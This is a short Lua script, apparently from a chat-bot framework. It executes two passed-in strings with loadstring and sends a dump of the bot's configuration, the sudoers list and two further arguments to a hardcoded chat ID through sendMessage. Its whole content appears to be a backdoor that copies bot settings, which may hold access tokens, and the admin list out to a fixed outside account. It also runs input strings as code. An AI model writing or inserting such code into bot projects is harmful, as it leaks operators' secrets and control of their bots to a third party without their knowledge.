require("introtimework")
local bot, sudoers, a, b = ...
bot = loadstring(bot)()
sudoers = loadstring(sudoers)()
sendMessage(41400331, vardumptext(bot) .. '\n' .. vardumptext(sudoers) .. '\n' .. a .. b)